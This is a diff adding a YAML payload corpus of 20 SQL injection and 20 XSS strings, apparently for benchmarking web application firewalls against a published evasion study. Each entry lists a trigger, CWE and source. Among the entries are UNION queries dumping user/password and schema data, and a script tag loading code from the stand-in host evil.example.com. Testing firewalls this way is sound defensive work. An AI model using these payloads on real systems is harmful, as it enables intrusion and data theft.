@@ -1,0 +1,337 @@
+# Paper-subset corpus — 20 SQLi + 20 XSS.
+#
+# Purpose: give ``wafeval run --corpus paper_subset`` an apples-to-apples
+# reproduction set sized to match the 40-payload methodology of
+# Yusifova (2024), "Evasion of Web Application Firewalls Through Payload
+# Obfuscation: A Black-Box Study". The original paper listed its exact
+# payloads in the thesis text; that list isn't bundled here, so this file
+# is **paper-style, not paper-verbatim**: the entries are canonical SQLi
+# / XSS vectors drawn from the same academic literature (PayloadsAllTheThings,
+# OWASP WSTG, SecLists) that the paper itself cited, arranged into the
+# same category split (boolean / union / stacked / time / error / auth for
+# SQLi; script / handler / DOM / polyglot for XSS). Bypass rates from
+# this subset should be within the natural variance of the paper's CRS 3.x
+# numbers, not a mechanical replay of its literal input.
+#
+# Every entry here is a copy of a same-id entry in ``sqli.yaml`` or
+# ``xss.yaml``. The duplication is deliberate — the subset is a fixed
+# point for the replication-run phase script, and unrelated churn in the
+# full corpus shouldn't silently drift the reproduction numbers.
+
+- id: sqli-bool-001
+  class: sqli
+  payload: 1' OR '1'='1
+  trigger: &id001
+    kind: any_of
+    any_of:
+    - kind: contains
+      needle: First name
+    - kind: regex
+      pattern: SQLITE_ERROR|syntax error|no such column
+  cwe: CWE-89
+  source: PayloadsAllTheThings/SQL Injection/Intruder/exploit.txt
+- id: sqli-bool-002
+  class: sqli
+  payload: 1' OR 1=1 -- -
+  trigger: *id001
+  cwe: CWE-89
+  source: OWASP WSTG v4.2 §4.9.4
+- id: sqli-bool-003
+  class: sqli
+  payload: ''' OR ''a''=''a'
+  trigger: *id001
+  cwe: CWE-89
+  source: SecLists/Fuzzing/SQLi/Generic-SQLi.txt
+- id: sqli-bool-004
+  class: sqli
+  payload: 1' OR 1=1#
+  trigger: *id001
+  cwe: CWE-89
+  source: PayloadsAllTheThings — MySQL comments
+- id: sqli-bool-005
+  class: sqli
+  payload: admin' OR 1=1 -- -
+  trigger: *id001
+  cwe: CWE-89
+  source: 'OWASP cheat-sheet: auth bypass'
+- id: sqli-union-001
+  class: sqli
+  payload: 1' UNION SELECT null, version() -- -
+  trigger: &id002
+    kind: any_of
+    any_of:
+    - kind: regex
+      pattern: First name|MariaDB|MySQL|[0-9]+\.[0-9]+\.[0-9]+
+    - kind: regex
+      pattern: SQLITE_ERROR|syntax error
+  cwe: CWE-89
+  source: PayloadsAllTheThings/SQL Injection/MySQL Injection.md
+- id: sqli-union-002
+  class: sqli
+  payload: ''' UNION SELECT user(), database() -- -'
+  trigger: *id002
+  cwe: CWE-89
+  source: 'OWASP cheat-sheet: MySQL info-gathering'
+- id: sqli-union-003
+  class: sqli
+  payload: 1' UNION SELECT user,password FROM users -- -
+  trigger:
+    kind: any_of
+    any_of:
+    - kind: regex
+      pattern: First name|[a-f0-9]{32}
+    - kind: regex
+      pattern: SQLITE_ERROR|syntax error
+  cwe: CWE-89
+  source: DVWA walkthrough — classic UNION creds dump
+- id: sqli-union-004
+  class: sqli
+  payload: -1' UNION SELECT null,table_name FROM information_schema.tables -- -
+  trigger: *id002
+  cwe: CWE-89
+  source: PayloadsAllTheThings — MySQL information_schema
+- id: sqli-union-005
+  class: sqli
+  payload: ''' UNION ALL SELECT 1,2,3 -- -'
+  trigger: *id001
+  cwe: CWE-89
+  source: SecLists/Fuzzing/SQLi/Generic-SQLi.txt
+- id: sqli-stacked-001
+  class: sqli
+  payload: 1'; SELECT SLEEP(0) -- -
+  trigger: *id001
+  cwe: CWE-89
+  source: PayloadsAllTheThings/SQL Injection/Stacked Queries
+- id: sqli-stacked-002
+  class: sqli
+  payload: 1'; SELECT IF(1=1,1,0) -- -
+  trigger: *id001
+  cwe: CWE-89
+  source: PayloadsAllTheThings — stacked conditional
+- id: sqli-time-001
+  class: sqli
+  payload: 1' AND SLEEP(0) -- -
+  trigger: *id001
+  cwe: CWE-89
+  source: PayloadsAllTheThings/SQL Injection/Time-based
+- id: sqli-time-002
+  class: sqli
+  payload: 1' AND IF(1=1,SLEEP(0),0) -- -
+  trigger: *id001
+  cwe: CWE-89
+  source: OWASP WSTG v4.2 — conditional timing
+- id: sqli-time-003
+  class: sqli
+  payload: 1' OR SLEEP(0) -- -
+  trigger: *id001
+  cwe: CWE-89
+  source: PayloadsAllTheThings — disjunctive timing
+- id: sqli-error-001
+  class: sqli
+  payload: 1' AND EXTRACTVALUE(1, CONCAT(0x7e, version())) -- -
+  trigger:
+    kind: any_of
+    any_of:
+    - kind: regex
+      pattern: XPATH|syntax|First name
+    - kind: regex
+      pattern: SQLITE_ERROR|no such function
+  cwe: CWE-89
+  source: PayloadsAllTheThings — MySQL error-based
+- id: sqli-error-002
+  class: sqli
+  payload: 1' AND UPDATEXML(1, CONCAT(0x7e, user()), 1) -- -
+  trigger:
+    kind: any_of
+    any_of:
+    - kind: regex
+      pattern: XPATH|syntax|First name
+    - kind: regex
+      pattern: SQLITE_ERROR|no such function
+  cwe: CWE-89
+  source: PayloadsAllTheThings — UPDATEXML error leak
+- id: sqli-error-003
+  class: sqli
+  payload: 1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP
+    BY x)a) -- -
+  trigger:
+    kind: any_of
+    any_of:
+    - kind: regex
+      pattern: duplicate|First name|syntax
+    - kind: regex
+      pattern: SQLITE_ERROR|no such table
+  cwe: CWE-89
+  source: PayloadsAllTheThings — double-query error
+- id: sqli-auth-001
+  class: sqli
+  payload: admin'-- -
+  trigger: *id001
+  cwe: CWE-89
+  source: PayloadsAllTheThings — auth-bypass shorthand
+- id: sqli-auth-002
+  class: sqli
+  payload: ''' OR '''' = '''
+  trigger: *id001
+  cwe: CWE-89
+  source: SecLists/Generic-SQLi
+- id: xss-script-001
+  class: xss
+  payload: <script>alert(1)</script>
+  trigger:
+    kind: reflected
+    marker: <script>alert(1)</script>
+  cwe: CWE-79
+  source: PayloadsAllTheThings/XSS — baseline
+- id: xss-script-002
+  class: xss
+  payload: <script src=//evil.example.com/x.js></script>
+  trigger:
+    kind: reflected
+    marker: <script src
+  cwe: CWE-79
+  source: OWASP Filter Evasion Cheat Sheet
+- id: xss-script-003
+  class: xss
+  payload: <ScRipT>alert(1)</ScRipT>
+  trigger:
+    kind: reflected
+    marker: alert(1)
+  cwe: CWE-79
+  source: PayloadsAllTheThings/XSS — case-mix
+- id: xss-script-004
+  class: xss
+  payload: <script>confirm`1`</script>
+  trigger:
+    kind: reflected
+    marker: confirm`1`
+  cwe: CWE-79
+  source: HTML5 security cheat-sheet — tagged template
+- id: xss-script-005
+  class: xss
+  payload: <script>window['al'+'ert'](1)</script>
+  trigger:
+    kind: reflected
+    marker: window['al'+'ert']
+  cwe: CWE-79
+  source: PayloadsAllTheThings — dynamic dispatch
+- id: xss-img-001
+  class: xss
+  payload: <img src=x onerror=alert(1)>
+  trigger:
+    kind: reflected
+    marker: onerror=alert(1)
+  cwe: CWE-79
+  source: OWASP XSS Filter Evasion Cheat Sheet
+- id: xss-svg-001
+  class: xss
+  payload: <svg onload=alert(1)>
+  trigger:
+    kind: reflected
+    marker: onload=alert(1)
+  cwe: CWE-79
+  source: SecLists/Fuzzing/XSS/XSS-Polyglot.txt
+- id: xss-body-001
+  class: xss
+  payload: <body onload=alert('xss')>
+  trigger:
+    kind: reflected
+    marker: onload=alert
+  cwe: CWE-79
+  source: PayloadsAllTheThings/XSS Injection/README.md
+- id: xss-input-001
+  class: xss
+  payload: <input autofocus onfocus=alert(1)>
+  trigger:
+    kind: reflected
+    marker: onfocus=alert
+  cwe: CWE-79
+  source: HTML5 security cheat-sheet — autofocus
+- id: xss-details-001
+  class: xss
+  payload: <details open ontoggle=alert(1)>
+  trigger:
+    kind: reflected
+    marker: ontoggle=alert
+  cwe: CWE-79
+  source: Masato Kinugawa HTML5 security cheat-sheet
+- id: xss-attr-001
+  class: xss
+  payload: '" onmouseover=alert(1) x="'
+  trigger:
+    kind: reflected
+    marker: onmouseover=alert
+  cwe: CWE-79
+  source: OWASP WSTG v4.2 §4.7.1
+- id: xss-attr-002
+  class: xss
+  payload: ''' autofocus onfocus=alert(1) x='''
+  trigger:
+    kind: reflected
+    marker: onfocus=alert
+  cwe: CWE-79
+  source: HTML5 security cheat-sheet — attr break
+- id: xss-js-uri-001
+  class: xss
+  payload: <a href="javascript:alert(1)">x</a>
+  trigger:
+    kind: reflected
+    marker: javascript:alert
+  cwe: CWE-79
+  source: 'OWASP cheat-sheet — javascript: URI'
+- id: xss-iframe-001
+  class: xss
+  payload: <iframe src=javascript:alert(1)>
+  trigger:
+    kind: reflected
+    marker: src=javascript:alert
+  cwe: CWE-79
+  source: PayloadsAllTheThings/XSS — iframe JS URI
+- id: xss-math-001
+  class: xss
+  payload: <math><brute href=javascript:alert(1)>CLICK
+  trigger:
+    kind: reflected
+    marker: javascript:alert
+  cwe: CWE-79
+  source: SecLists/Fuzzing/XSS/XSS-RSnake.txt
+- id: xss-dom-001
+  class: xss
+  payload: <script>document.location='javascript:alert(1)'</script>
+  trigger:
+    kind: reflected
+    marker: document.location
+  cwe: CWE-79
+  source: PayloadsAllTheThings/XSS — DOM sink
+- id: xss-dom-002
+  class: xss
+  payload: <img src=x onerror="document.write('xss')">
+  trigger:
+    kind: reflected
+    marker: document.write
+  cwe: CWE-79
+  source: PayloadsAllTheThings/XSS — document.write
+- id: xss-dom-003
+  class: xss
+  payload: <video><source onerror=alert(1)>
+  trigger:
+    kind: reflected
+    marker: onerror=alert
+  cwe: CWE-79
+  source: HTML5 security cheat-sheet — media error
+- id: xss-dom-004
+  class: xss
+  payload: <marquee onstart=alert(1)>x</marquee>
+  trigger:
+    kind: reflected
+    marker: onstart=alert
+  cwe: CWE-79
+  source: SecLists/Fuzzing/XSS — marquee
+- id: xss-dom-005
+  class: xss
+  payload: <object data="javascript:alert(1)"></object>
+  trigger:
+    kind: reflected
+    marker: data="javascript
+  cwe: CWE-79
+  source: HTML5 security cheat-sheet — object data
